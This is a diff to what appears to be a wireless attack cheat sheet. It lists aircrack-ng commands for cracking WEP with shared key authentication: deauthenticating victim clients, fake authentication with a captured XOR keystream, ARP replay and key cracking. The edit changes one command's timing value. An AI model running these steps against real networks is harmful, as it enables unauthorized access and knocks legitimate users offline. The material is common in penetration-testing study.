@@ -24,7 +24,7 @@ aircrack-ng capture.cap - start cracking
 Cracking WEP with SKA:
 airodump-ng -c <AP> --bssid <AP MAC> -w capture.cap mon0    -   start sniffing
 aireplay-ng -0 1 -a <AP MAC> -c <victim MAC> mon0 - Deauth the client to get XOR keystream
-aireplay-ng -1 0 -e <ESSID> -y <XOR FILE> -a <AP MAC> -h <ATTACKING MAC> mon0 - fake auth using xor keystream
+aireplay-ng -1 6000 -e <ESSID> -y <XOR FILE> -a <AP MAC> -h <ATTACKING MAC> mon0 - fake auth using xor keystream
 aireplay-ng -3 -b <AP MAC> -h <ATTACKING MAC> mon0 - arp request replay attack
 aireplay-ng -0 1 -a <AP MAC> -c <victim MAC> mon0 - Deauth the client
 aircrack-ng capture.cap - start cracking
